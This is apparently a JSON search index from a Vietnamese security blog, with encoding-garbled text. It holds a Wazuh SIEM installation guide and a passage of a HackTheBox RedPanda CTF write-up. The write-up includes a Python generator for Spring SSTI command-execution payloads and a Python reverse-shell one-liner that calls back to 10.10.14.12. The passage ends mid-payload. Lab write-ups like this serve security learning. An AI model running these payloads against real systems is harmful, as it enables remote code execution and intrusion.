wazuh vá»\ncurl -sO https://packages.wazuh.com/4.4/wazuh-certs-tool.sh curl -sO https://packages.wazuh.com/4.4/config.yml VÃ o config.yml\nnano config.yml Thay Ä‘á»•i cÃ¡c giÃ¡ trá»‹ â€œnameâ€ vÃ  â€œipâ€ thÃ nh tÃªn lÃ  ip cá»§a server (TrÆ°á»ng há»£p tÃ¡ch wazuh-indexer vÃ  wazuh-manager thÃ nh 2 mÃ¡y chá»§ váº­t lÃ½ thÃ¬ pháº£i Ä‘áº·t Ä‘Ãºng ip cá»§a tá»«ng mÃ¡y chá»§).\nnodes: # Wazuh indexer nodes indexer: - name: dc-indexer ip: 10.10.24.1 #- name: node-2 # ip: \u0026lt;indexer-node-ip\u0026gt; #- name: node-3 # ip: \u0026lt;indexer-node-ip\u0026gt; # Wazuh server nodes # If there is more than one Wazuh server # node, each one must have a node_type server: - name: dc-manager ip: 10.10.24.1 # node_type: master #- name: wazuh-2 # ip: \u0026lt;wazuh-manager-ip\u0026gt; # node_type: worker #- name: wazuh-3 # ip: \u0026lt;wazuh-manager-ip\u0026gt; # node_type: worker # Wazuh dashboard nodes dashboard: - name: dc-dashboard ip: 10.10.24.1 Cháº¡y wazuh-certs-tool.sh Ä‘á»ƒ táº¡o cert\nbash ./wazuh-certs-tool.sh -A tar -cvf ./wazuh-certificates.tar -C ./wazuh-certificates/ . Node installation # CÃ i Ä‘áº·t cÃ¡c gÃ³i cÃ²n thiáº¿u\napt-get install debconf adduser procps apt-get install gnupg apt-transport-https Táº¡o wazuh repository\ncurl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import \u0026amp;\u0026amp; chmod 644 /usr/share/keyrings/wazuh.gpg echo \u0026#34;deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main\u0026#34; | tee -a /etc/apt/sources.list.d/wazuh.list apt-get update CÃ i Ä‘áº·t wazuh-indexer\napt-get -y install wazuh-indexer Cáº¥u hÃ¬nh cÃ¡c thÃ´ng sá»‘ trong opensearch\nnano /etc/wazuh-indexer/opensearch.yml network.host: â€œ10.10.24.1â€ node.name: â€œdc-indexerâ€ cluster.initial_master_nodes: - \u0026#34;dc-indexer\u0026#34; â€¦. discovery.seed_hosts:\t# bá» dáº¥u â€œ#â€ á»Ÿ Ä‘áº§u dÃ²ng - \u0026#34;10.10.24.1\u0026#34;\t# bá» dáº¥u â€œ#â€ á»Ÿ Ä‘áº§u dÃ²ng â€¦. path.logs: /var/log/wazuh-indexer bootstrap.memory_lock: true â€¦. plugins.security.nodes_dn: - \u0026#34;CN=dc-indexer,OU=Wazuh,O=Wazuh,L=California,C=US\u0026#34; #- \u0026#34;CN=node-2,OU=Wazuh,O=Wazuh,L=California,C=US\u0026#34; Táº¡o cert. Äáº·t tÃªn node name giá»‘ng tÃªn node name cáº¥u hÃ¬nh trong file opensearch.yml\nNODE_NAME=dc-indexer mkdir /etc/wazuh-indexer/certs tar -xf ./wazuh-certificates.tar -C /etc/wazuh-indexer/certs/ ./$NODE_NAME.pem ./$NODE_NAME-key.pem ./admin.pem ./admin-key.pem ./root-ca.pem mv -n /etc/wazuh-indexer/certs/$NODE_NAME.pem /etc/wazuh-indexer/certs/indexer.pem mv -n /etc/wazuh-indexer/certs/$NODE_NAME-key.pem /etc/wazuh-indexer/certs/indexer-key.pem chmod 500 /etc/wazuh-indexer/certs chmod 400 /etc/wazuh-indexer/certs/* chown -R wazuh-indexer:wazuh-indexer /etc/wazuh-indexer/certs Chá»‰nh sá»­a giá»›i háº¡n tÃ i nguyÃªn há»‡ thá»‘ng\nnano /usr/lib/systemd/system/wazuh-indexer.service [Service] LimitMEMLOCK=infinity\t# ThÃªm dÃ²ng nÃ y TÄƒng kÃ­ch thÆ°á»›c khÃ´ng gian heap\nnano /etc/wazuh-indexer/jvm.options TÃ i liá»‡u Wazuh khuyáº¿n cÃ¡o khÃ´ng gian heap sá»­ dá»¥ng tá»‘i thiá»ƒu báº±ng ná»­a tá»•ng dung lÆ°á»£ng RAM hiá»‡n cÃ³. VÃ­ dá»¥ RAM cá»§a tÃ´i hiá»‡n cÃ³ lÃ  8Gb thÃ¬ tÃ´i sáº½ sá»­a 1 thÃ nh 4\n# Xms represents the initial size of total heap space # Xmx represents the maximum size of total heap space -Xms4g -Xmx4g Báº­t vÃ  cháº¡y dá»‹ch vá»¥\nsystemctl daemon-reload systemctl enable wazuh-indexer systemctl start wazuh-indexer Cluster initialization # Cháº¡y file /usr/share/wazuh-indexer/bin/indexer-security-init.sh trÃªn cÃ¡c node Ä‘á»ƒ táº£i lÃªn thÃ´ng tin cÃ¡c cert Ä‘Ã£ táº¡o\n/usr/share/wazuh-indexer/bin/indexer-security-init.sh Kiá»ƒm tra táº¥t cáº£ cÃ¡c cÃ i Ä‘áº·t Ä‘Ã£ thÃ nh cÃ´ng vÃ  dá»‹ch vá»¥ khÃ´ng cÃ³ lá»—i (LÆ°u Ã½: táº¯t proxy trÆ°á»›c khi thá»±c hiá»‡n lá»‡nh curl)\ncurl -k -u admin:admin https://10.10.24.1:9200 Káº¿t quáº£ giá»‘ng bÃªn dÆ°á»›i lÃ  thÃ nh cÃ´ng\n{ \u0026#34;name\u0026#34; : \u0026#34;dc-indexer\u0026#34;, \u0026#34;cluster_name\u0026#34; : \u0026#34;wazuh-cluster\u0026#34;, \u0026#34;cluster_uuid\u0026#34; : \u0026#34;bMz0BKdlRVui5jF-mlt6yg\u0026#34;, \u0026#34;version\u0026#34; : { \u0026#34;number\u0026#34; : \u0026#34;7.10.2\u0026#34;, \u0026#34;build_type\u0026#34; : \u0026#34;rpm\u0026#34;, \u0026#34;build_hash\u0026#34; : \u0026#34;f2f809ea280ffba217451da894a5899f1cec02ab\u0026#34;, \u0026#34;build_date\u0026#34; : \u0026#34;2022-12-12T22:17:42.341124910Z\u0026#34;, \u0026#34;build_snapshot\u0026#34; : false, \u0026#34;lucene_version\u0026#34; : \u0026#34;8.10.1\u0026#34;, \u0026#34;minimum_wire_compatibility_version\u0026#34; : \u0026#34;7.10.0\u0026#34;, \u0026#34;minimum_index_compatibility_version\u0026#34; : \u0026#34;7.0.0\u0026#34; }, \u0026#34;tagline\u0026#34; : \u0026#34;The OpenSearch Project: https://opensearch.org/\u0026#34; } WAZUH MANAGER # Wazuh server node installation # CÃ i Ä‘áº·t wazuh-manager apt-get -y install wazuh-manager Cháº¡y wazuh-manager\nsystemctl daemon-reload systemctl enable wazuh-manager systemctl start wazuh-manager Kiá»ƒm tra tráº¡ng thÃ¡i wazuh-manager\nsystemctl status wazuh-manager CÃ i Ä‘áº·t filebeat apt-get -y install filebeat Táº£i file cáº¥u hÃ¬nh filebeat\ncurl -so /etc/filebeat/filebeat.yml https://packages.wazuh.com/4.4/tpl/wazuh/filebeat/filebeat.yml Sá»­a cáº¥u hÃ¬nh filebeat vá»›i hosts lÃ  ip cá»§a indexer node\nnano /etc/filebeat/filebeat.yml hosts: [\u0026#34;10.10.24.1:9200\u0026#34;] Táº¡o keystore\nfilebeat keystore create echo admin | filebeat keystore add username --stdin --force echo admin | filebeat keystore add password --stdin --force Táº£i template cho indexer\ncurl -so /etc/filebeat/wazuh-template.json https://raw.githubusercontent.com/wazuh/wazuh/4.4/extensions/elasticsearch/7.x/wazuh-template.json chmod go+r /etc/filebeat/wazuh-template.json CÃ i Ä‘áº·t cÃ¡c module cá»§a wazuh cho filebeat\ncurl -s https://packages.wazuh.com/4.x/filebeat/wazuh-filebeat-0.2.tar.gz | tar -xvz -C /usr/share/filebeat/module Táº¡o cert cho filebeat, Ä‘áº·t tÃªn NODE_NAME giá»‘ng vá»›i tÃªn cá»§a server trong file config.yml\nNODE_NAME=dc-manager mkdir /etc/filebeat/certs tar -xf ./wazuh-certificates.tar -C /etc/filebeat/certs/ ./$NODE_NAME.pem ./$NODE_NAME-key.pem ./root-ca.pem mv -n /etc/filebeat/certs/$NODE_NAME.pem /etc/filebeat/certs/filebeat.pem mv -n /etc/filebeat/certs/$NODE_NAME-key.pem /etc/filebeat/certs/filebeat-key.pem chmod 500 /etc/filebeat/certs chmod 400 /etc/filebeat/certs/* chown -R root:root /etc/filebeat/certs Cháº¡y filebeat\nsystemctl daemon-reload systemctl enable filebeat systemctl start filebeat Kiá»ƒm tra tráº¡ng thÃ¡i filebeat\nfilebeat test output Káº¿t quáº£ giá»‘ng bÃªn dÆ°á»›i lÃ  thÃ nh cÃ´ng\nelasticsearch: https://10.10.24.1:9200... parse url... OK connection... parse host... OK dns lookup... OK addresses: 127.0.0.1 dial up... OK TLS... security: server\u0026#39;s certificate chain verification is enabled handshake... OK TLS version: TLSv1.3 dial up... OK talk to server... OK version: 7.10.2 WAZUH DASHBOARD # Táº£i cÃ¡c package cÃ²n thiáº¿u\napt-get install debhelper tar curl libcap2-bin Táº£i wazuh-dashboard\napt-get -y install wazuh-dashboard Sá»­a cáº¥u hÃ¬nh dashboard\nnano /etc/wazuh-dashboard/opensearch_dashboards.yml server.host: 10.10.24.1 server.port: 443 opensearch.hosts: https://10.10.24.1:9200 Táº¡o cert cho dashboard, Ä‘áº·t tÃªn NODE_NAME giá»‘ng vá»›i tÃªn cá»§a dashboard trong file config.yml\nNODE_NAME=dc-dashboard mkdir /etc/wazuh-dashboard/certs tar -xf ./wazuh-certificates.tar -C /etc/wazuh-dashboard/certs/ ./$NODE_NAME.pem ./$NODE_NAME-key.pem ./root-ca.pem mv -n /etc/wazuh-dashboard/certs/$NODE_NAME.pem /etc/wazuh-dashboard/certs/dashboard.pem mv -n /etc/wazuh-dashboard/certs/$NODE_NAME-key.pem /etc/wazuh-dashboard/certs/dashboard-key.pem chmod 500 /etc/wazuh-dashboard/certs chmod 400 /etc/wazuh-dashboard/certs/* chown -R wazuh-dashboard:wazuh-dashboard /etc/wazuh-dashboard/certs Cháº¡y dashboard\nsystemctl daemon-reload systemctl enable wazuh-dashboard systemctl start wazuh-dashboard Truy cáº­p vÃ o dashboard trÃªn web theo Ä‘á»‹a chá»‰ https://10.10.24.1 vá»›i username vÃ  password máº·c Ä‘á»‹nh admin:admin\nÄá»•i password máº·c Ä‘á»‹nh cá»§a tÃ i khoáº£n admin\ncurl -so wazuh-passwords-tool.sh https://packages.wazuh.com/4.4/wazuh-passwords-tool.sh bash wazuh-passwords-tool.sh -u admin -p \u0026lt;máº­t kháº©u\u0026gt; LÆ°u Ã½: Náº¿u há»‡ thá»‘ng cÃ³ proxy (internet gateway) thÃ¬ pháº£i Ä‘áº·t proxy trÆ°á»›c khi cÃ i Ä‘áº·t\nSet proxy cho apt Ä‘á»ƒ táº£i cÃ¡c package trÃªn trang chá»§ Ubuntu nano /etc/apt/apt.conf\nAcquire::https::Proxy \u0026quot;http://ip:port\u0026quot;;\nAcquire::http::Proxy \u0026quot;http://ip:port\u0026quot;;\nLÆ°u file vÃ  login láº¡i vÃ o account\nSet proxy cho server nano /etc/environment\nThÃªm vÃ o file cÃ¡c dÃ²ng sau:\nHTTP_PROXY=\u0026quot;http://ip:port\u0026quot;\nHTTPS_PROXY=\u0026quot;http://ip:port\u0026quot;\nNO_PROXY=\u0026quot;10.10.24.1,localhost,127.0.0.1,::1\u0026quot;\nLÆ°u file vÃ  login láº¡i vÃ o account\n","date":"6 May 2023","externalUrl":null,"permalink":"/soc/wazuh-installation/","section":"SOC","summary":"","title":"CÃ i Ä‘áº·t vÃ  cáº¥u hÃ¬nh há»‡ thá»‘ng WAZUH","type":"soc"},{"content":"","date":"24 October 2022","externalUrl":null,"permalink":"/tags/apache-ioutils-library/","section":"Tags","summary":"","title":"Apache IOUtils Library","type":"tags"},{"content":"Song song vá»›i viá»‡c reup láº¡i nhá»¯ng writeup cÅ©, tÃ´i váº«n tiáº¿p tá»¥c giáº£i cÃ¡c CTF má»›i khi cÃ³ thá»i gian. VÃ  hÃ´m nay, cÃ³ thá»i gian ráº£nh 1 chÃºt thÃ¬ tÃ´i thá»­ sá»©c vá»›i Hackthebox - RedPanda\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m lÃ  quÃ©t cÃ¡c cá»•ng Ä‘ang má»Ÿ trÃªn mÃ¡y chá»§ má»¥c tiÃªu.\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ sudo nmap -sC -sV 10.10.11.170 [sudo] password for neo: Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-24 02:27 EDT Nmap scan report for 10.10.11.170 Host is up (0.086s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA) | 256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA) |_ 256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519) 8080/tcp open http-proxy |_http-title: Red Panda Search | Made with Spring Boot | fingerprint-strings: | GetRequest: | HTTP/1.1 200 | Content-Type: text/html;charset=UTF-8 | Content-Language: en-US | Date: Mon, 24 Oct 2022 06:27:24 GMT | Connection: close | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34; dir=\u0026#34;ltr\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;meta author=\u0026#34;wooden_k\u0026#34;\u0026gt; | \u0026lt;!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw --\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/panda.css\u0026#34; type=\u0026#34;text/css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/main.css\u0026#34; type=\u0026#34;text/css\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Red Panda Search | Made with Spring Boot\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;div class=\u0026#39;pande\u0026#39;\u0026gt; | \u0026lt;div class=\u0026#39;ear left\u0026#39;\u0026gt;\u0026lt;/div\u0026gt; | \u0026lt;div class=\u0026#39;ear right\u0026#39;\u0026gt;\u0026lt;/div\u0026gt; | \u0026lt;div class=\u0026#39;whiskers left\u0026#39;\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;/div\u0026gt; | \u0026lt;div class=\u0026#39;whiskers right\u0026#39;\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;/div\u0026gt; | \u0026lt;div class=\u0026#39;face\u0026#39;\u0026gt; | \u0026lt;div class=\u0026#39;eye | HTTPOptions: | HTTP/1.1 200 | Allow: GET,HEAD,OPTIONS | Content-Length: 0 | Date: Mon, 24 Oct 2022 06:27:24 GMT | Connection: close | RTSPRequest: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 435 | Date: Mon, 24 Oct 2022 06:27:24 GMT | Connection: close | \u0026lt;!doctype html\u0026gt;\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP Status 400 | Request\u0026lt;/title\u0026gt;\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;HTTP Status 400 |_ Request\u0026lt;/h1\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; |_http-open-proxy: Proxy might be redirecting requests 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8080-TCP:V=7.93%I=7%D=10/24%Time=63563048%P=x86_64-pc-linux-gnu%r(G SF:etRequest,690,\u0026#34;HTTP/1\\.1\\x20200\\x20\\r\\nContent-Type:\\x20text/html;chars SF:et=UTF-8\\r\\nContent-Language:\\x20en-US\\r\\nDate:\\x20Mon,\\x2024\\x20Oct\\x2 SF:02022\\x2006:27:24\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026lt;!DOCTYPE\\x20ht SF:ml\u0026gt;\\n\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\\x20dir=\\\u0026#34;ltr\\\u0026#34;\u0026gt;\\n\\x20\\x20\u0026lt;head\u0026gt;\\n\\x20\\x20\\x20 SF:\\x20\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20author=\\\u0026#34;wood SF:en_k\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;!--Codepen\\x20by\\x20khr2003:\\x20https://codep SF:en\\.io/khr2003/pen/BGZdXw\\x20--\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;styles SF:heet\\\u0026#34;\\x20href=\\\u0026#34;css/panda\\.css\\\u0026#34;\\x20type=\\\u0026#34;text/css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x SF:20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;css/main\\.css\\\u0026#34;\\x20type=\\\u0026#34;text/ SF:css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;Red\\x20Panda\\x20Search\\x20\\|\\x20Made\\x20 SF:with\\x20Spring\\x20Boot\u0026lt;/title\u0026gt;\\n\\x20\\x20\u0026lt;/head\u0026gt;\\n\\x20\\x20\u0026lt;body\u0026gt;\\n\\n\\x20 SF:\\x20\\x20\\x20\u0026lt;div\\x20class=\u0026#39;pande\u0026#39;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;div\\x20cla SF:ss=\u0026#39;ear\\x20left\u0026#39;\u0026gt;\u0026lt;/div\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;div\\x20class=\u0026#39;ear\\x20 SF:right\u0026#39;\u0026gt;\u0026lt;/div\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;div\\x20class=\u0026#39;whiskers\\x20left\u0026#39; SF:\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;\\n\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;/div\u0026gt;\\n\\x20\\x20\\x20\\ SF:x20\\x20\\x20\u0026lt;div\\x20class=\u0026#39;whiskers\\x20right\u0026#39;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;\\n\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt; SF:/div\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;div\\x20class=\u0026#39;face\u0026#39;\u0026gt;\\n\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\u0026lt;div\\x20class=\u0026#39;eye\u0026#34;)%r(HTTPOptions,75,\u0026#34;HTTP/1\\.1\\x20200\\ SF:x20\\r\\nAllow:\\x20GET,HEAD,OPTIONS\\r\\nContent-Length:\\x200\\r\\nDate:\\x20M SF:on,\\x2024\\x20Oct\\x202022\\x2006:27:24\\x20GMT\\r\\nConnection:\\x20close\\r\\n SF:\\r\\n\u0026#34;)%r(RTSPRequest,24E,\u0026#34;HTTP/1\\.1\\x20400\\x20\\r\\nContent-Type:\\x20text SF:/html;charset=utf-8\\r\\nContent-Language:\\x20en\\r\\nContent-Length:\\x2043 SF:5\\r\\nDate:\\x20Mon,\\x2024\\x20Oct\\x202022\\x2006:27:24\\x20GMT\\r\\nConnectio SF:n:\\x20close\\r\\n\\r\\n\u0026lt;!doctype\\x20html\u0026gt;\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt; SF:HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\x20Request\u0026lt;/title\u0026gt;\u0026lt;style\\x SF:20type=\\\u0026#34;text/css\\\u0026#34;\u0026gt;body\\x20{font-family:Tahoma,Arial,sans-serif;}\\x20h SF:1,\\x20h2,\\x20h3,\\x20b\\x20{color:white;background-color:#525D76;}\\x20h1\\ SF:x20{font-size:22px;}\\x20h2\\x20{font-size:16px;}\\x20h3\\x20{font-size:14p SF:x;}\\x20p\\x20{font-size:12px;}\\x20a\\x20{color:black;}\\x20\\.line\\x20{heig SF:ht:1px;background-color:#525D76;border:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;H SF:TTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\x20Request\u0026lt;/h1\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/htm SF:l\u0026gt;\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.17 seconds â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ Truy cáº­p vÃ o web vá»›i port 8080\nTrang web cÃ³ 1 pháº§n input, tÃ´i thá»­ ngay vá»›i cÃ¡c XSS hay XXE, nhÆ°ng Ä‘á»u tháº¥t báº¡i.\nKhi nháº­p thá»­ id, tÃ´i nháº­n Ä‘Æ°á»£c thÃ´ng tin cá»§a 1 loáº¡i gáº¥u trÃºc, nhÆ°ng thá»­ cÃ¡c command khÃ¡c thÃ¬ Ä‘á»u khÃ´ng cÃ³ káº¿t quáº£. Tuy nhiÃªn dÆ°á»›i pháº§n \u0026ldquo;Author\u0026rdquo;, tÃ´i cÃ³ 1 cÃ¡i tÃªn \u0026ldquo;woodenk\u0026rdquo;, click vÃ o nÃ³ vÃ  tÃ´i cÃ³ 2 thÆ° má»¥c chá»©a áº£nh vá» gáº¥u trÃºc. KhÃ´ng cÃ³ gÃ¬ Ä‘áº·c biá»‡t Ä‘á»ƒ cÃ³ thá»ƒ khai thÃ¡c á»Ÿ Ä‘Ã¢y.\nTÃ´i nháº­n ra url nÃ y giá»‘ng vá»›i form cá»§a PHP LFI payload nÃªn Ä‘Ã£ thá»­ cÃ¡c trÆ°á»ng há»£p nhÆ°ng Ä‘á»u khÃ´ng cÃ³ káº¿t quáº£.\nSSTI # Quay láº¡i nmap thÃ¬ tÃ´i nháº­n ra tÃ´i Ä‘Ã£ bá» qua title cá»§a web nÃ y \u0026ldquo;Made with Spring Boot\u0026rdquo;. PhÃ¢n tÃ­ch qua Spring Boot thÃ¬ Ä‘Ã¢y lÃ  1 extension cá»§a Spring Framework giÃºp Ä‘Æ¡n giáº£n hÃ³a cÃ¡c bÆ°á»›c cáº¥u hÃ¬nh trong láº­p trÃ¬nh vÃ  Ä‘Æ°á»£c viáº¿t báº±ng java.\nMá»™t Ä‘iá»u quan trá»ng ná»¯a lÃ  Spring Boot sá»­ dá»¥ng Template engine Ä‘á»ƒ thao tÃ¡c vá»›i dá»¯ liá»‡u Ä‘á»ƒ in nÃ³ ra mÃ n hÃ¬nh, nÃªn tÃ´i thá»­ tÃ¬m exploit hay payload liÃªn quan Ä‘áº¿n Template injection vÃ  tÃ´i tÃ¬m tháº¥y káº¿t quáº£ á»Ÿ Ä‘Ã¢y\nSSTI (Server Side Template Injection) cÅ©ng na nÃ¡ giá»‘ng XXS lÃ  cho phÃ©p káº» táº¥n cÃ´ng nháº­p cÃ¡c Ä‘áº§u vÃ o khÃ´ng an toÃ n nhÆ° cÃ¡c Ä‘oáº¡n code HTML hay cÃ¡c kÃ½ tá»± Ä‘áº·c biá»‡t\n${7*7} *{7*7} #{7*7} CÃ²n ráº¥t nhiá»u nhá»¯ng payload Ä‘Æ¡n giáº£n khÃ¡c Ä‘á»ƒ kiá»ƒm tra, vÃ  tÃ´i nháº­n Ä‘Æ°á»£c káº¿t quáº£ vá»›i *{7*7}\nVá»›i payload tÃ¬m Ä‘Æ°á»£c phÃ­a trÃªn, tÃ´i sáº½ thá»­ thay $ báº±ng * á»Ÿ Ä‘áº§u payload\nNhÆ°ng lÃ m cÃ¡ch nÃ o Ä‘á»ƒ hiá»ƒu Ä‘Æ°á»£c payload nÃ y?\nTÃ´i tÃ¬m Ä‘Æ°á»£c trÃªn github 1 lá»i giáº£i thÃ­ch khÃ¡ rÃµ rÃ ng, nÃ³ á»Ÿ Ä‘Ã¢y.\nThe payload became quite huge. To sum up, I used the Apache IOUtils library. I converted cat etc/passwd into ASCII characters using the character class, passed this value to the exec() method and got the input stream and passed it to the toString() method of IOUtils class. Awesome isnt it.\n#!/usr/bin/env python from __future__ import print_function import sys message = input(\u0026#39;Enter message to encode:\u0026#39;) print(\u0026#39;Decoded string (in ASCII):\\n\u0026#39;) for ch in message: print(\u0026#39;.concat(T(java.lang.Character).toString(%s))\u0026#39; % ord(ch), end=\u0026#34;\u0026#34;), print(\u0026#39;\\n\u0026#39;) Code nÃ y chá»‰ sinh ra format cá»§a mÃ£ ASCII chá»© khÃ´ng Ä‘áº§y Ä‘á»§ payload nÃªn tÃ´i sáº½ sá»­a nÃ³ Ä‘á»ƒ cÃ³ thá»ƒ RCE.\n#!/usr/bin/python from __future__ import print_function import sys message = input(\u0026#39;Enter message to encode:\u0026#39;) encode = [] print(\u0026#39;Ecoded string (in ASCII):\\n\u0026#39;) for ch in message: encode.append(str(ord(ch))) payload = \u0026#34;*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)\u0026#34; % encode[0] for ch in encode[1:]: payload += \u0026#34;.concat(T(java.lang.Character).toString({}))\u0026#34;.format(ch) payload += \u0026#34;).getInputStream())}\u0026#34; print(payload) Thá»­ sá»­ dá»¥ng command \u0026ldquo;cat /etc/passwd\u0026rdquo; vÃ  Ä‘á»‘i chiáº¿u vá»›i káº¿t quáº£ trong payload máº«u vÃ  nÃ³ trÃ¹ng khá»›p, nghÄ©a lÃ  code cá»§a tÃ´i Ä‘Ã£ Ä‘Ãºng.\nTÃ´i sáº½ dÃ¹ng payload cá»§a python Ä‘á»ƒ RCE vá» mÃ¡y mÃ¬nh\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.10.14.12\u0026quot;,2402));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026quot;bash\u0026quot;)'\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ python test.py Enter message to encode:python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.14.12\u0026#34;,2402));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026#34;bash\u0026#34;)\u0026#39; Ecoded string (in ASCII): *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(112).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(39)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.